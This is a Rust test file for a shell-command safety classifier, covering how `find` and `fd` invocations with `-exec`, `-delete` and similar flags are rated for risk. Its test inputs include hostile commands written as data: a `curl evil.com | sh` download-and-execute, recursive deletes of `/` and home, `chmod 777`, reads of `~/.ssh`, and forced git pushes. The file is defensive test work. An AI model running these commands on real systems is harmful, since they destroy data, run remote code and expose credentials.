//! `find`/`fd`(`fdfind`) payload-aware classification tests.
//!
//! Covers `crates/sh-guard-core/src/rules/find_fd.rs`: plain reads, every
//! find action (`-exec`/`-execdir`/`-ok`/`-okdir`/`-delete`/`-fprintf`/
//! `-fprint`/`-fprint0`/`-fls`/`-L`/`-H`/`-follow`), every fd exec form
//! (`-x`/`-X`/`--exec`/`--exec-batch`), payload inheritance (rm/chmod/
//! curl|sh/git push --force/gh repo delete), fd's scope-widening flags,
//! scope amplification for `-delete`, the false-positive list from the
//! task brief, pipelines, compound commands, and full-path/`fdfind`
//! invocations. Mirrors `test_rules_git.rs`/`test_rules_gh.rs` in style.

use sh_guard_core::*;

fn analyze(cmd: &str) -> AnalysisResult {
    classify(cmd, None)
}

fn first_sub(result: &AnalysisResult) -> &CommandAnalysis {
    &result.sub_commands[0]
}

fn has_risk_factor(a: &CommandAnalysis, rf: RiskFactor) -> bool {
    a.risk_factors.contains(&rf)
}

fn has_intent(a: &CommandAnalysis, intent: Intent) -> bool {
    a.intent.contains(&intent)
}

// ========================================================================
// Plain reads -> Search intent, no CommandExecution flag, low score
// ========================================================================

#[test]
fn plain_reads_stay_search_and_low_risk() {
    let cases: &[&str] = &[
        "find . -type f",
        "find . -name x -print",
        "find . -name '*.rs' -print",
        "find . -iname '*.RS'",
        "find . -path './src/*'",
        "find . -perm -4000 -print",
        "find . -user root -print",
        "find . -group wheel -print",
        "find . -size +10M",
        "find . -newermt '1 day ago' -print",
        "find . -newer ref.txt -print",
        "find . -mtime -1",
        "find . -maxdepth 2 -type d",
        "find . -prune",
        "find . -xdev -type f",
        "find . -samefile ref.txt",
        "find . -printf '%p\\n'",
        "find . -ls",
        "find . -print0",
        "fd",
        "fd pattern",
        "fd pattern /some/path",
        "fd -e rs",
        "fd --extension rs",
        "fd -t f pattern",
        "fd --max-depth 2 pattern",
        "fd --changed-within 1d pattern",
        "fd -0",
        "fd --print0",
        "fd --strip-cwd-prefix",
    ];

    for cmd in cases {
        let result = analyze(cmd);
        let a = first_sub(&result);
        assert!(
            has_intent(a, Intent::Search),
            "{cmd}: expected Search intent, got {:?}",
            a.intent
        );
        assert!(
            !has_risk_factor(a, RiskFactor::CommandExecution),
            "{cmd}: unexpected CommandExecution risk factor"
        );
        assert_eq!(
            result.level,
            RiskLevel::Safe,
            "{cmd}: expected SAFE, got {:?} ({})",
            result.level,
            result.score
        );
    }
}

// ========================================================================
// find -exec/-execdir/-ok/-okdir: payload inheritance
// ========================================================================

#[test]
fn exec_family_escalates_to_execute_and_inherits_payload() {
    let cases: &[&str] = &[
        "find . -exec rm -rf {} +",
        r"find . -exec rm -rf {} \;",
        r"find . -execdir rm -rf {} \;",
        r"find . -ok rm -rf {} \;",
        r"find . -okdir rm -rf {} \;",
    ];
    for cmd in cases {
        let result = analyze(cmd);
        let a = first_sub(&result);
        // The payload's own intent leads -- `-exec rm` is a deletion, not a
        // generic "code execution" -- and never the wrapper's Search.
        assert_eq!(
            a.intent.first(),
            Some(&Intent::Delete),
            "{cmd}: reason should lead with the payload's intent, not Search"
        );
        assert!(
            has_risk_factor(a, RiskFactor::CommandExecution),
            "{cmd}: expected CommandExecution risk factor"
        );
        assert!(
            has_risk_factor(a, RiskFactor::RecursiveDelete),
            "{cmd}: expected inherited RecursiveDelete risk factor from rm -rf"
        );
        assert!(
            matches!(result.level, RiskLevel::Danger | RiskLevel::Critical),
            "{cmd}: expected Danger/Critical, got {:?} ({})",
            result.level,
            result.score
        );
    }
}

#[test]
fn exec_family_harmless_payload_still_reports_execution_but_scores_lower_than_rm() {
    // A harmless payload inherits its own (low) intent rather than being
    // floored at Intent::Execute, which would put every `-exec` at Danger
    // and make `-exec ls` indistinguishable from `-exec rm`.
    let harmless = analyze(r"find . -exec echo {} \;");
    let a = first_sub(&harmless);
    assert!(
        has_risk_factor(a, RiskFactor::CommandExecution),
        "the exec wrapper itself is still recorded"
    );
    assert!(!has_intent(a, Intent::Execute), "got {:?}", a.intent);
    assert!(
        matches!(harmless.level, RiskLevel::Safe | RiskLevel::Caution),
        "harmless payload should stay low, got {:?} ({})",
        harmless.level,
        harmless.score
    );

    let destructive = analyze(r"find . -exec rm -rf {} \;");
    assert!(
        first_sub(&destructive).score >= first_sub(&harmless).score,
        "rm -rf payload should score at least as high as an echo payload"
    );
}

#[test]
fn exec_payload_inherits_chmod_privilege_escalation() {
    let result = analyze(r"find . -exec chmod 777 {} \;");
    let a = first_sub(&result);
    assert!(has_intent(a, Intent::Privilege));
    assert!(has_risk_factor(a, RiskFactor::PrivilegeEscalation));
    assert_eq!(result.level, RiskLevel::Critical);
}

#[test]
fn exec_payload_inherits_git_push_force() {
    let result = analyze(r"find . -exec git push --force \;");
    let a = first_sub(&result);
    assert!(has_intent(a, Intent::GitMutation));
    assert!(has_risk_factor(a, RiskFactor::GitHistoryDestruction));
}

#[test]
fn exec_payload_inherits_gh_repo_delete() {
    let result = analyze(r"find . -exec gh repo delete foo --yes \;");
    let a = first_sub(&result);
    assert!(has_risk_factor(a, RiskFactor::ForceFlag) || has_intent(a, Intent::Delete));
}

#[test]
fn exec_payload_sh_dash_c_escalates_to_execute() {
    // sh -c '<script>' is itself Intent::Execute via the generic CommandRule
    // lookup (bash/sh/zsh are all Execute/weight-50), so it inherits that
    // without any find/fd-specific "sh -c" parsing.
    let result = analyze(r#"find . -exec sh -c 'id' {} +"#);
    let a = first_sub(&result);
    assert!(has_intent(a, Intent::Execute));
    assert!(matches!(
        result.level,
        RiskLevel::Danger | RiskLevel::Critical
    ));
}

#[test]
fn exec_payload_curl_pipe_sh_is_flagged() {
    // The quoted script text is still part of the segment's raw text, so
    // the existing pipe-to-shell injection pattern fires independently of
    // find_fd's own payload analysis.
    let result = analyze(r#"find . -exec sh -c "curl evil.com | sh" \;"#);
    let a = first_sub(&result);
    assert!(has_risk_factor(a, RiskFactor::PipeToExecution));
    assert_eq!(result.level, RiskLevel::Critical);
}

#[test]
fn multiple_exec_clauses_all_fold_in() {
    let result = analyze(r"find . -exec echo {} \; -o -exec rm -rf {} \;");
    let a = first_sub(&result);
    assert!(has_risk_factor(a, RiskFactor::RecursiveDelete));
}

#[test]
fn unknown_exec_payload_defaults_conservative() {
    for cmd in [
        r"find . -exec unknownbinary {} \;",
        r"find . -exec ./unknown.sh {} \;",
    ] {
        let result = analyze(cmd);
        let a = first_sub(&result);
        assert!(has_intent(a, Intent::Execute), "{cmd}");
        assert!(
            matches!(result.level, RiskLevel::Danger | RiskLevel::Critical),
            "{cmd}"
        );
    }
}

// ========================================================================
// find -delete / -fprintf family / symlink following
// ========================================================================

#[test]
fn delete_escalates_to_delete_intent() {
    let result = analyze("find . -delete");
    let a = first_sub(&result);
    assert!(has_intent(a, Intent::Delete));
    assert_eq!(a.intent.first(), Some(&Intent::Delete));
    assert!(has_risk_factor(a, RiskFactor::RecursiveDelete));
}

#[test]
fn delete_scope_amplification() {
    for cmd in ["find / -delete", "find ~ -delete", "find /etc -delete"] {
        let result = analyze(cmd);
        assert!(
            matches!(result.level, RiskLevel::Danger | RiskLevel::Critical),
            "{cmd}: expected Danger/Critical, got {:?} ({})",
            result.level,
            result.score
        );
    }
}

#[test]
fn fprintf_family_writes_arbitrary_file() {
    for cmd in [
        "find . -fprintf out.txt %p",
        "find . -fprint out.txt",
        "find . -fprint0 out.txt",
        "find . -fls out.txt",
    ] {
        let result = analyze(cmd);
        let a = first_sub(&result);
        assert!(has_intent(a, Intent::Write), "{cmd}: expected Write intent");
        assert!(has_risk_factor(a, RiskFactor::Write), "{cmd}");
    }
}

#[test]
fn fprint_to_sensitive_path_amplifies() {
    let result = analyze("find . -fprint /etc/passwd");
    assert!(matches!(
        result.level,
        RiskLevel::Danger | RiskLevel::Critical
    ));
}

#[test]
fn symlink_following_flags_stay_safe_but_noted() {
    for cmd in [
        "find . -L -name '*.txt'",
        "find . -H -name '*.txt'",
        "find . -follow",
    ] {
        let result = analyze(cmd);
        let a = first_sub(&result);
        assert!(has_risk_factor(a, RiskFactor::BroadScope), "{cmd}");
        assert_eq!(result.level, RiskLevel::Safe, "{cmd}");
    }
}

// ========================================================================
// fd -x/-X/--exec/--exec-batch: payload inheritance
// ========================================================================

#[test]
fn read_only_exec_payloads_stay_low_while_destructive_ones_go_critical() {
    // Regression: the wrapper used to force Intent::Execute (weight 50)
    // regardless of payload, flooring every -exec/-x at DANGER 80 -- so
    // `-exec ls` and `fd -x echo` were reported as dangerous code
    // execution, only 10 points below `-exec rm`.
    for cmd in [
        "find . -exec ls -la {} +",
        "find . -exec wc -l {} +",
        "find . -exec grep -l TODO {} +",
        "fd -x echo",
        "fd -x wc -l",
        // Reading every matched file is still a read: safe on its own, and
        // amplified only by a sensitive search root (asserted below).
        "find . -exec cat {} +",
        "fd -X cat",
    ] {
        let result = analyze(cmd);
        assert_eq!(
            result.level,
            RiskLevel::Safe,
            "{cmd}: read-only payload should stay safe, got {:?} ({})",
            result.level,
            result.score
        );
    }
    // A sensitive search root still lifts a read-only payload out of safe.
    let secrets = analyze("find ~/.ssh -exec cat {} +");
    assert!(
        matches!(secrets.level, RiskLevel::Caution | RiskLevel::Danger),
        "sensitive root should amplify, got {:?} ({})",
        secrets.level,
        secrets.score
    );
    for cmd in ["find . -exec rm -rf {} +", "fd -x rm -rf"] {
        assert_eq!(analyze(cmd).level, RiskLevel::Critical, "{cmd}");
    }
    // An unrecognized payload binary is still conservatively Execute.
    let unknown = analyze("fd -x ./unknown-binary");
    assert!(has_intent(first_sub(&unknown), Intent::Execute));
    assert!(matches!(
        unknown.level,
        RiskLevel::Danger | RiskLevel::Critical
    ));
}

#[test]
fn fd_exec_forms_escalate_and_inherit_payload() {
    let cases: &[&str] = &[
        "fd -x rm -rf",
        "fd -X rm -rf",
        "fd --exec rm -rf",
        "fd --exec-batch rm -rf",
    ];
    for cmd in cases {
        let result = analyze(cmd);
        let a = first_sub(&result);
        assert_eq!(a.intent.first(), Some(&Intent::Delete), "{cmd}");
        assert!(has_risk_factor(a, RiskFactor::RecursiveDelete), "{cmd}");
        assert!(has_risk_factor(a, RiskFactor::CommandExecution), "{cmd}");
        assert_eq!(result.level, RiskLevel::Critical, "{cmd}");
    }
}

#[test]
fn fd_exec_sh_dash_c_escalates() {
    let result = analyze("fd -X sh -c id");
    let a = first_sub(&result);
    assert!(has_intent(a, Intent::Execute));
    assert!(matches!(
        result.level,
        RiskLevel::Danger | RiskLevel::Critical
    ));
}

#[test]
fn fd_exec_chmod_777_inherits_privilege_escalation() {
    let result = analyze("fd . -x chmod 777");
    let a = first_sub(&result);
    assert!(has_intent(a, Intent::Privilege));
    assert!(has_risk_factor(a, RiskFactor::PrivilegeEscalation));
    assert_eq!(result.level, RiskLevel::Critical);
}

#[test]
fn fd_exec_inherits_git_flags() {
    let result = analyze("fd -x git push --force");
    let a = first_sub(&result);
    assert!(has_intent(a, Intent::GitMutation));
    assert!(has_risk_factor(a, RiskFactor::GitHistoryDestruction));
}

#[test]
fn fd_exec_inherits_gh_flags() {
    let result = analyze("fd -x gh repo delete foo --yes");
    let a = first_sub(&result);
    assert!(has_risk_factor(a, RiskFactor::ForceFlag));
}

#[test]
fn fd_exec_with_terminator_resumes_scanning_fd_flags() {
    // Per fd's actual grammar (verified against fd 10.5.0): `-x`/`-X`
    // consume all following positionals as the payload with NO mandatory
    // terminator; `\;` is optional and only needed when more fd flags
    // follow on the same command line.
    let result = analyze(r"fd -x echo {} \; -e rs");
    let a = first_sub(&result);
    assert!(has_risk_factor(a, RiskFactor::CommandExecution));
    // The payload is just `echo {}` -- "rs" (the value of the trailing
    // `-e`) must not leak into it and change its classification, and `-e
    // rs` must not itself be misread as anything dangerous.
    assert!(!has_risk_factor(a, RiskFactor::RecursiveDelete));
}

#[test]
fn fd_exec_no_terminator_consumes_rest_of_line() {
    let result = analyze("fd -x rm -rf");
    let a = first_sub(&result);
    assert!(has_risk_factor(a, RiskFactor::RecursiveDelete));
}

#[test]
fn fd_placeholders_do_not_change_payload_head_classification() {
    // fd's placeholders ({}, {/}, {//}, {.}, {/.}) are just payload argv,
    // not fd's own flags -- the payload's head command is still what
    // drives classification.
    for cmd in [
        "fd -x rm -rf {}",
        "fd -x mv {} {.}.bak",
        "fd -x rm {//}",
        "fd -x echo {/}",
        "fd -x echo {/.}",
    ] {
        let result = analyze(cmd);
        let a = first_sub(&result);
        assert!(has_risk_factor(a, RiskFactor::CommandExecution), "{cmd}");
    }
    // rm-headed payloads with a placeholder argument still inherit rm's
    // own dangerous-flag analysis.
    let result = analyze("fd -x rm -rf {}");
    assert!(has_risk_factor(
        first_sub(&result),
        RiskFactor::RecursiveDelete
    ));
}

// ========================================================================
// fd scope-widening flags
// ========================================================================

#[test]
fn fd_scope_widening_flags_add_broad_scope() {
    for cmd in [
        "fd --hidden pattern",
        "fd -H pattern",
        "fd --no-ignore pattern",
        "fd -I pattern",
        "fd --unrestricted pattern",
        "fd -u pattern",
        "fd --follow pattern",
        "fd -L pattern",
        "fd -HI pattern",
    ] {
        let result = analyze(cmd);
        let a = first_sub(&result);
        assert!(has_risk_factor(a, RiskFactor::BroadScope), "{cmd}");
        assert_eq!(
            result.level,
            RiskLevel::Safe,
            "{cmd}: plain read should stay safe"
        );
    }
}

#[test]
fn fd_scope_widening_flags_before_exec_carry_through() {
    let result = analyze("fd --hidden --no-ignore -x cat");
    let a = first_sub(&result);
    assert!(has_risk_factor(a, RiskFactor::BroadScope));
    assert!(has_risk_factor(a, RiskFactor::CommandExecution));
    assert_eq!(a.intent.first(), Some(&Intent::Read), "got {:?}", a.intent);
}

// ========================================================================
// fd target scope: PATTERN vs PATH positional heuristic
// ========================================================================

#[test]
fn fd_single_positional_is_pattern_not_path() {
    // `fd ~/.ssh` searches the cwd for files matching the pattern
    // "~/.ssh" -- it must NOT be read as a path target (which would
    // otherwise flag it as accessing secrets).
    let result = analyze("fd ~/.ssh");
    assert_eq!(result.level, RiskLevel::Safe);
    let a = first_sub(&result);
    assert!(!has_risk_factor(a, RiskFactor::BroadScope));
}

#[test]
fn fd_second_positional_is_path() {
    let result = analyze("fd x ~/.ssh");
    let a = first_sub(&result);
    assert!(
        a.targets
            .iter()
            .any(|t| t.path.as_deref() == Some("~/.ssh")),
        "expected ~/.ssh to be extracted as a path target, got {:?}",
        a.targets
    );
    assert_eq!(result.level, RiskLevel::Caution);
}

#[test]
fn fd_search_path_flag_is_always_a_path_target() {
    let result = analyze("fd --search-path / pattern");
    let a = first_sub(&result);
    assert!(
        a.targets.iter().any(|t| t.path.as_deref() == Some("/")),
        "expected / to be extracted as a path target, got {:?}",
        a.targets
    );
    assert!(matches!(
        result.level,
        RiskLevel::Caution | RiskLevel::Danger
    ));
}

#[test]
fn fd_pattern_containing_dangerous_text_is_not_destructive() {
    // A PATTERN that happens to look like a dangerous command must not be
    // treated as one -- it's just a regex/glob being searched for.
    let result = analyze("fd 'rm -rf' .");
    let a = first_sub(&result);
    assert!(!has_risk_factor(a, RiskFactor::RecursiveDelete));
    assert_eq!(result.level, RiskLevel::Safe);
}

// ========================================================================
// False-positive list from the task brief
// ========================================================================

#[test]
fn false_positives_stay_safe() {
    let cases: &[&str] = &[
        "find . -name -delete",
        "find . -name '*.rs' -print",
        r#"find . -name "-exec""#,
        "fd -e rs -x echo",
        "fd --exec-batch echo -- -x",
        "find . -name '-exec'",
        r#"find . -name "*.sh" -print"#,
    ];
    for cmd in cases {
        let result = analyze(cmd);
        let a = first_sub(&result);
        assert!(
            !has_risk_factor(a, RiskFactor::RecursiveDelete),
            "{cmd}: false positive on RecursiveDelete"
        );
    }
    // -e/--exec-batch's own value/payload must not be mistaken for the
    // -delete action or trigger CommandExecution outside their real scope.
    let name_delete = analyze("find . -name -delete");
    assert!(has_intent(first_sub(&name_delete), Intent::Search));
    assert_eq!(name_delete.level, RiskLevel::Safe);
}

#[test]
fn quoted_pattern_flag_is_not_a_real_flag() {
    let result = analyze(r#"find . -name "*.sh" -print"#);
    assert_eq!(result.level, RiskLevel::Safe);
}

// ========================================================================
// Pipelines / compound commands
// ========================================================================

#[test]
fn find_print0_xargs_rm_rf_stays_critical() {
    // Pin the existing xargs-based escalation path -- this must not
    // regress now that find/fd get their own classifier.
    let result = analyze("find . -print0 | xargs -0 rm -rf");
    assert_eq!(result.level, RiskLevel::Critical);
}

#[test]
fn find_exec_in_compound_command() {
    let result = analyze(r"find . -exec rm -rf {} \; && echo done");
    assert_eq!(result.sub_commands.len(), 2);
    let a = &result.sub_commands[0];
    assert!(has_risk_factor(a, RiskFactor::RecursiveDelete));
}

#[test]
fn fd_exec_in_pipeline() {
    let result = analyze("fd -x git push --force ; echo done");
    assert_eq!(result.sub_commands.len(), 2);
    let a = &result.sub_commands[0];
    assert!(has_risk_factor(a, RiskFactor::GitHistoryDestruction));
}

// ========================================================================
// Full-path binaries and fdfind
// ========================================================================

#[test]
fn full_path_and_fdfind_binaries_still_classified() {
    let cases: &[(&str, RiskFactor)] = &[
        (
            r"/usr/bin/find . -exec rm -rf {} \;",
            RiskFactor::RecursiveDelete,
        ),
        ("fdfind -x rm -rf", RiskFactor::RecursiveDelete),
        (
            "/opt/homebrew/bin/fd -x rm -rf",
            RiskFactor::RecursiveDelete,
        ),
    ];
    for (cmd, rf) in cases {
        let result = analyze(cmd);
        let a = first_sub(&result);
        assert!(has_risk_factor(a, *rf), "{cmd}");
        assert_eq!(result.level, RiskLevel::Critical, "{cmd}");
    }
}
